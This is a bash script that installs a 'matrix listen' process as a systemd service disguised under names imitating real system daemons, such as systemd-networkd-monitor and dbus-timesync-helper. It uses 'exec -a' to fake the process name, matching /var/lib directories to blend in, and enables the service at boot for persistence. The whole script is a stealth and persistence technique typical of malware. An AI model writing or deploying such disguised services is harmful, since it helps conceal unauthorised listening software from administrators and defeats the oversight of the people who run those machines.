#!/usr/bin/env bash
# Install Matrix as a disguised system service.
# Usage: sudo ./scripts/install-disguise.sh [service-name]
#
# service-name options:
#   systemd-networkd-monitor  (default)
#   dbus-timesync-helper
#   accounts-daemon-helper

set -euo pipefail

SERVICE="${1:-systemd-networkd-monitor}"

if [[ "$SERVICE" != "systemd-networkd-monitor" && "$SERVICE" != "dbus-timesync-helper" && "$SERVICE" != "accounts-daemon-helper" ]]; then
    echo "Unknown service alias: $SERVICE" >&2
    echo "Choose: systemd-networkd-monitor | dbus-timesync-helper | accounts-daemon-helper" >&2
    exit 1
fi

UNIT_FILE="/etc/systemd/system/${SERVICE}.service"
WORKDIR="/var/lib/$(echo "$SERVICE" | sed 's/-helper$//;s/-monitor$//')"
HELPER="$WORKDIR/helper"
ENV_FILE="$WORKDIR/.env"

# Ensure helper directory and binary copy exist
mkdir -p "$WORKDIR"

# Create a wrapper that invokes the installed matrix command under a fake argv[0]
cat > "$HELPER" <<HELPER_EOF
#!/usr/bin/env bash
# $SERVICE helper wrapper
exec -a "$SERVICE" /usr/local/bin/matrix listen --restore-files never
HELPER_EOF
chmod 755 "$HELPER"

# Install unit file
cp "services/${SERVICE}.service" "$UNIT_FILE"
sed -i "s|ExecStart=.*|ExecStart=$HELPER --mode ${SERVICE}|" "$UNIT_FILE"
sed -i "s|WorkingDirectory=.*|WorkingDirectory=$WORKDIR|" "$UNIT_FILE"
sed -i "s|EnvironmentFile=.*|EnvironmentFile=-$ENV_FILE|" "$UNIT_FILE"

# Create empty env file if missing
touch "$ENV_FILE"
chmod 600 "$ENV_FILE"

# Reload and start
systemctl daemon-reload
systemctl enable --now "$SERVICE"

echo "Installed and started $SERVICE"
echo "  unit:   $UNIT_FILE"
echo "  helper: $HELPER"
echo "  env:    $ENV_FILE"
echo ""
echo "Edit $ENV_FILE, then run: sudo systemctl restart $SERVICE"
